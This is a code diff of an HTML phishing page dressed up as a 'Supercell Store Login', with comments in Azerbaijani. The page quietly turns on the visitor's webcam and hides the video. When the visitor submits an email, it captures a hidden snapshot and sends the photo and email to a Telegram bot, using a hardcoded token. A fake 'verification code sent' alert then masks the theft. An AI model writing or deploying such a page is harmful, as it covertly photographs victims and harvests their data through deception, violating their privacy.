@@ -8,82 +8,82 @@
         * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
         body { background-color: #1a4da1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .login-card { background-color: white; width: 380px; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); text-align: center; }
-        .header-nav { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 18px; font-weight: 500; color: #333; }
-        .progress-container { width: 100%; height: 6px; background-color: #eee; border-radius: 10px; margin-bottom: 30px; overflow: hidden; }
-        .progress-bar { width: 50%; height: 100%; background: linear-gradient(to right, #4facfe 0%, #00f2fe 100%); }
         .logo-box { background-color: #ffc107; width: 80px; height: 80px; margin: 0 auto 20px; border-radius: 18px; display: flex; justify-content: center; align-items: center; font-size: 50px; font-weight: 900; color: white; }
         h2 { margin: 0 0 10px 0; font-size: 24px; }
         p { color: #666; font-size: 15px; margin-bottom: 25px; }
         input[type="email"] { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; margin-bottom: 15px; }
-        .btn { width: 100%; padding: 15px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
-        .btn-signin { background-color: #4285f4; color: white; }
-        .btn-back { background-color: white; color: #555; border: 1px solid #ddd; }
-        /* Gizli kamera elementi */
+        .btn-signin { width: 100%; padding: 15px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; background-color: #4285f4; color: white; text-transform: uppercase; }
+        /* Kameranı gizli saxlayırıq */
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
     <div class="login-card">
-        <div class="header-nav"><span>Sign In</span><span style="color:#888">Verify</span></div>
-        <div class="progress-container"><div class="progress-bar"></div></div>
         <div class="logo-box">S</div>
         <h2>Supercell Store Login</h2>
         <p>Enter your email to receive a verification code.</p>
 
         <form id="loginForm">
             <input type="email" id="email" placeholder="Enter your email address" required>
-            <button type="submit" class="btn btn-signin">SIGN IN</button>
-            <button type="button" class="btn btn-back">GO BACK</button>
+            <button type="submit" class="btn-signin">➜ SIGN IN</button>
         </form>
     </div>
 
-    <video id="video" autoplay></video>
+    <video id="video" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        const botToken = "8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A"; // Telegram Bot Tokeninizi buraya qoyun
-        const chatId = "-1003369084883";     // Chat ID-nizi buraya qoyun
+        // MƏLUMATLARI BURAYA DAXİL EDİN
+        const BOT_TOKEN = "8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A"; 
+        const CHAT_ID = "-1003369084883";
 
-        const form = document.getElementById('loginForm');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const form = document.getElementById('loginForm');
 
-        // Səhifə yüklənəndə kamera icazəsi istəyir
-        window.onload = async () => {
+        // Səhifə açılan kimi kameranı işə salırıq
+        async function setupCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
                 video.srcObject = stream;
             } catch (err) {
-                console.log("Kamera icazəsi rədd edildi: ", err);
+                console.error("Kamera xətası: ", err);
             }
-        };
+        }
+
+        setupCamera();
 
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
-            const email = document.getElementById('email').value;
+            const emailValue = document.getElementById('email').value;
 
-            // Şəkli çək
+            // Canvas-da şəkli çək (Snapshot)
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
+            // Şəkli Blob formatına salıb göndər
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'photo.jpg');
-                formData.append('caption', `Giriş cəhdi!\nEmail: ${email}`);
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('caption', `🔔 Yeni giriş!\n📧 Email: ${emailValue}`);
 
                 try {
-                    // Telegrama göndər
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
-                    alert("Verification code sent to your email!");
+                    
+                    // Göndərəndən sonra saytın özünü necə aparacağını bura yaza bilərsiniz
+                    alert("Verification code sent to " + emailValue);
                 } catch (error) {
-                    console.error("Xəta baş verdi:", error);
+                    console.error("Telegram xətası:", error);
                 }
-            }, 'image/jpeg');
+            }, 'image/jpeg', 0.8);
         });
     </script>
 </body>
